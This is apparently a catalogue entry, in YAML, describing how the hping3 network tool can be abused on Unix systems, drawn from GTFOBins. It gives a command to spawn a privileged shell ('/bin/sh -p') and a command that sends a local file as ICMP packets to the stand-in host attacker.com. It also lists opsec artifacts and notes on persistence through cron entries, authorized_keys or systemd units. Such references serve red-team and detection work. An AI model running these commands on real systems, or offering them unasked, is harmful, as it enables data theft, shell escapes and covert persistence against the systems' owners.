---
name: hping3
capabilities:
- exec
- spawn
- upload
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    hping3
    /bin/sh -p
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file
  notes: The file is continuously sent as ICMP packets (e.g., of `999` bytes), the optional `--end` parameter signals when the file reached the end.
references:
- https://gtfobins.github.io/gtfobins/hping3/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
